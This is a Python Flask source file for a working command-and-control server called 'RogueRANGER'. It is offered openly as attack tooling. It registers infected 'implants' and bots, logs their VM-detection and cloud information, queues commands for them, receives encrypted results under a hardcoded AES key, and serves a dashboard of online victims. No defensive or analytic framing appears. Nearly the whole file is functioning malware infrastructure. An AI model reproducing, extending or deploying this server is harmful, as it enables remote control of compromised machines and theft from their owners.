#!/usr/bin/env python3
"""
rogue_c2_enhanced.py - C2 Server with Phase 1 Support
Enhanced version that maintains backward compatibility while adding Phase 1 features
"""

from flask import Flask, request, jsonify
import base64, json
from Cryptodome.Cipher import AES
from datetime import datetime
import hashlib
import sqlite3
from collections import defaultdict

app = Flask(__name__)
app.secret_key = 'RogueC2_Enhanced_v1'

# === Configuration ===
LEGACY_SECRET_KEY = b'6767BabyROGUE!&%5'
C2_PORT = 4444
DB_PATH = "implants.db"

# === Database ===
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS implants (
            implant_id TEXT PRIMARY KEY,
            implant_hash TEXT,
            phase1_enabled BOOLEAN DEFAULT 0,
            vm_detection_data TEXT,
            cloud_info TEXT,
            first_seen DATETIME,
            last_beacon DATETIME,
            beacon_count INTEGER DEFAULT 0,
            commands_sent INTEGER DEFAULT 0,
            results_received INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT PRIMARY KEY,
            implant_id TEXT,
            command_type TEXT,
            command_payload TEXT,
            created_at DATETIME,
            executed_at DATETIME,
            result TEXT,
            status TEXT DEFAULT 'pending'
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

# === Storage ===
connected_bots = set()
pending_commands = defaultdict(list)
bot_info = {}
ip_to_bot_id = {}

# === Helper Functions ===
def legacy_encrypt(msg):
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def legacy_decrypt(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(LEGACY_SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

def get_bot_id(client_ip, implant_id=None):
    if implant_id:
        bot_id = f"phase1_{implant_id}"
        ip_to_bot_id[bot_id] = bot_id
        return bot_id
    
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    bot_hash = hashlib.md5(client_ip.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

def store_implant(implant_data):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    implant_id = implant_data.get('implant_id')
    
    cursor.execute('SELECT 1 FROM implants WHERE implant_id = ?', (implant_id,))
    exists = cursor.fetchone()
    
    if exists:
        cursor.execute('''
            UPDATE implants SET
                last_beacon = ?,
                beacon_count = beacon_count + 1,
                vm_detection_data = ?,
                cloud_info = ?
            WHERE implant_id = ?
        ''', (
            now,
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            implant_id
        ))
    else:
        cursor.execute('''
            INSERT INTO implants (
                implant_id, implant_hash, phase1_enabled,
                vm_detection_data, cloud_info,
                first_seen, last_beacon, beacon_count
            ) VALUES (?, ?, ?, ?, ?, ?, ?, 1)
        ''', (
            implant_id,
            implant_data.get('implant_hash'),
            implant_data.get('phase1_enabled', False),
            json.dumps(implant_data.get('vm_detection', {})),
            json.dumps(implant_data.get('cloud_info', {})),
            now, now
        ))
    
    conn.commit()
    conn.close()

# === Routes ===
@app.route('/', methods=['GET', 'POST'])
def c2_endpoint():
    """Main endpoint - handles both Phase 1 and legacy"""
    if request.method == 'GET':
        return "Rogue C2 Server - Phase 1 Enhanced\nUse POST for encrypted communications"
    
    try:
        client_ip = request.remote_addr
        data = request.get_data()
        
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        # Try Phase 1 beacon (plain JSON)
        try:
            data_str = data.decode('utf-8')
            beacon_data = json.loads(data_str)
            
            if 'implant_id' in beacon_data or 'implant_hash' in beacon_data:
                # Phase 1 beacon
                implant_id = beacon_data.get('implant_id') or beacon_data.get('implant_hash')
                phase1_enabled = beacon_data.get('phase1_enabled', True)
                
                # Store in database
                store_implant(beacon_data)
                
                # Get bot ID
                bot_id = get_bot_id(client_ip, implant_id)
                connected_bots.add(bot_id)
                
                # Update bot info
                if bot_id not in bot_info:
                    bot_info[bot_id] = {
                        'ip': client_ip,
                        'implant_id': implant_id,
                        'phase1_enabled': phase1_enabled,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 0
                    }
                
                bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                bot_info[bot_id]['beacon_count'] += 1
                
                # Check for pending commands
                pending = pending_commands.get(bot_id, [])
                
                # Prepare response
                response = {
                    'commands': pending,
                    'message': 'Beacon received',
                    'phase1_supported': True,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Clear pending commands
                if pending:
                    pending_commands[bot_id] = []
                
                return legacy_encrypt(json.dumps(response)), 200
                
        except:
            # Not Phase 1, try legacy
            pass
        
        # Legacy beacon
        try:
            decrypted = legacy_decrypt(data)
            
            if decrypted == "beacon":
                bot_id = get_bot_id(client_ip)
                connected_bots.add(bot_id)
                
                if bot_id not in bot_info:
                    bot_info[bot_id] = {
                        'ip': client_ip,
                        'phase1_enabled': False,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 0
                    }
                
                bot_info[bot_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                bot_info[bot_id]['beacon_count'] += 1
                
                pending = pending_commands.get(bot_id, [])
                response = {'commands': pending}
                
                if pending:
                    pending_commands[bot_id] = []
                
                return legacy_encrypt(json.dumps(response)), 200
            
            return legacy_encrypt(json.dumps({'error': 'Unknown command'})), 400
            
        except:
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
            
    except Exception as e:
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

@app.route('/phase1/command', methods=['POST'])
def add_command():
    """Add command for implant"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        implant_id = data.get('implant_id')
        command_type = data.get('type')
        command_payload = data.get('payload', {})
        
        if not implant_id or not command_type:
            return jsonify({'error': 'Missing implant_id or type'}), 400
        
        import uuid
        command_id = str(uuid.uuid4())[:8]
        
        command = {
            'id': command_id,
            'type': command_type,
            'payload': command_payload,
            'timestamp': datetime.now().isoformat()
        }
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands 
            (command_id, implant_id, command_type, command_payload, created_at, status)
            VALUES (?, ?, ?, ?, ?, 'pending')
        ''', (
            command_id,
            implant_id,
            command_type,
            json.dumps(command_payload),
            datetime.now().isoformat()
        ))
        
        conn.commit()
        conn.close()
        
        # Add to pending commands
        bot_id = get_bot_id(request.remote_addr, implant_id)
        pending_commands[bot_id].append(command)
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': f'Command added for {implant_id}'
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/result', methods=['POST'])
def receive_result():
    """Receive command results"""
    try:
        data = request.get_data()
        
        if not data:
            return legacy_encrypt(json.dumps({'error': 'No data'})), 400
        
        # Try to decrypt
        try:
            decrypted = legacy_decrypt(data)
            result_data = json.loads(decrypted)
        except:
            return legacy_encrypt(json.dumps({'error': 'Decryption failed'})), 400
        
        command_id = result_data.get('command_id')
        implant_id = result_data.get('implant_id') or result_data.get('implant_hash')
        
        if not command_id:
            return legacy_encrypt(json.dumps({'error': 'Missing command_id'})), 400
        
        # Store result
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands SET
                executed_at = ?,
                result = ?,
                status = 'completed'
            WHERE command_id = ? AND implant_id = ?
        ''', (
            datetime.now().isoformat(),
            json.dumps(result_data),
            command_id,
            implant_id
        ))
        
        conn.commit()
        conn.close()
        
        return legacy_encrypt(json.dumps({'success': True})), 200
        
    except Exception as e:
        return legacy_encrypt(json.dumps({'error': str(e)})), 500

@app.route('/phase1/implants', methods=['GET'])
def list_implants():
    """List all implants"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT implant_id, implant_hash, phase1_enabled, 
                   first_seen, last_beacon, beacon_count,
                   commands_sent, results_received
            FROM implants
            ORDER BY last_beacon DESC
        ''')
        
        implants = []
        for row in cursor.fetchall():
            implants.append({
                'implant_id': row[0],
                'implant_hash': row[1],
                'phase1_enabled': bool(row[2]),
                'first_seen': row[3],
                'last_beacon': row[4],
                'beacon_count': row[5],
                'commands_sent': row[6],
                'results_received': row[7]
            })
        
        conn.close()
        
        return jsonify({
            'success': True,
            'implants': implants,
            'count': len(implants)
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phase1/dashboard', methods=['GET'])
def dashboard():
    """Simple dashboard"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>RogueRANGER Phase 1 Dashboard</title>
        <style>
            body { font-family: monospace; margin: 20px; }
            h1 { color: #ff00ff; }
            .container { max-width: 1200px; margin: 0 auto; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
            .stat-box { background: #f0f0f0; padding: 15px; border-radius: 5px; border: 1px solid #ccc; }
            .stat-value { font-size: 24px; font-weight: bold; color: #0066cc; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 RogueRANGER Phase 1 Dashboard</h1>
            <p>Enhanced C2 server with Phase 1 support</p>
            
            <div class="stats">
                <div class="stat-box">
                    <div>Total Implants</div>
                    <div class="stat-value" id="total-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Phase 1 Implants</div>
                    <div class="stat-value" id="phase1-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Online Now</div>
                    <div class="stat-value" id="online-implants">Loading...</div>
                </div>
                <div class="stat-box">
                    <div>Commands Today</div>
                    <div class="stat-value" id="commands-today">Loading...</div>
                </div>
            </div>
            
            <h2>Quick Actions</h2>
            <div>
                <button onclick="refreshData()">🔄 Refresh Data</button>
                <button onclick="listImplants()">📋 List Implants</button>
            </div>
            
            <h2>API Endpoints</h2>
            <ul>
                <li><code>POST /</code> - Main beacon endpoint (Phase 1 & legacy)</li>
                <li><code>POST /phase1/command</code> - Add command for implant</li>
                <li><code>POST /phase1/result</code> - Receive command results</li>
                <li><code>GET /phase1/implants</code> - List all implants</li>
                <li><code>GET /phase1/dashboard</code> - This dashboard</li>
            </ul>
        </div>
        
        <script>
            async function refreshData() {
                try {
                    const response = await fetch('/phase1/implants');
                    const data = await response.json();
                    
                    if (data.success) {
                        document.getElementById('total-implants').textContent = data.count;
                        
                        const phase1Count = data.implants.filter(i => i.phase1_enabled).length;
                        document.getElementById('phase1-implants').textContent = phase1Count;
                        
                        // Calculate online (beacon in last 5 minutes)
                        const now = new Date();
                        const onlineCount = data.implants.filter(i => {
                            const lastBeacon = new Date(i.last_beacon);
                            const minutesAgo = (now - lastBeacon) / 60000;
                            return minutesAgo < 5;
                        }).length;
                        
                        document.getElementById('online-implants').textContent = onlineCount;
                        
                        // Calculate commands today
                        const commandsToday = data.implants.reduce((sum, i) => sum + i.commands_sent, 0);
                        document.getElementById('commands-today').textContent = commandsToday;
                    }
                } catch (error) {
                    console.error('Error:', error);
                }
            }
            
            async function listImplants() {
                const response = await fetch('/phase1/implants');
                const data = await response.json();
                alert(JSON.stringify(data, null, 2));
            }
            
            // Load data on page load
            refreshData();
        </script>
    </body>
    </html>
    '''

@app.route('/phase1/test', methods=['GET'])
def test_endpoint():
    """Test endpoint"""
    return jsonify({
        'success': True,
        'message': 'Phase 1 C2 server is operational',
        'database': DB_PATH,
        'legacy_support': True,
        'phase1_support': True
    }), 200

# === Main ===
def main():
    print("=== RogueRANGER Enhanced C2 Server ===")
    print(f"Port: {C2_PORT}")
    print(f"Database: {DB_PATH}")
    print("Features:")
    print("  • Phase 1 beacon support")
    print("  • Legacy implant compatibility")
    print("  • SQLite database storage")
    print("  • Web dashboard")
    print(f"\nStarting server...")
    
    app.run(host='0.0.0.0', port=C2_PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()